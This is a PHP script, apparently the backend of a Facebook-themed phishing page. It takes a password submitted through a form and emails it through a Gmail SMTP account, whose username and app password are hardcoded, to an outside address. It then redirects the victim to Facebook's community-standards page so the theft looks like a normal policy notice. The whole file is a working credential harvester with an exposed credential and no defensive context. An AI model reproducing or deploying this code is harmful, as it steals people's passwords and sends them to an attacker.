<?php
ob_start(); 

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/Exception.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/PHPMailer.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pass = $_POST['pass'];

    $smtp_host = "smtp.gmail.com";
    $smtp_port = "587";
    $smtp_username = "webinowebino10@gmail.com";
    $smtp_password = "fftvjmzjhwjuxcoy";
    $to = "bbelan028@gmail.com"; // change to the email you want to receive messages

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = 0;
        $mail->isSMTP();
        $mail->Host       = $smtp_host;
        $mail->SMTPAuth   = true;
        $mail->Username   = $smtp_username;
        $mail->Password   = $smtp_password;
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = $smtp_port;

        // Recipients
        $mail->setFrom($smtp_username, 'Mailer');
        $mail->addAddress($to, 'Joe User');

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'Detailsssss';
        $mail->Body    = 'Password: '.$pass;

        $mail->send();
        // Redirect after success
        header("Location: https://transparency.fb.com/en-gb/policies/community-standards/");
        exit();
    } catch (Exception $e) {
        // Redirect after failure
        header("Location: https://transparency.fb.com/en-gb/policies/community-standards/");
        exit();
    }
}
?>
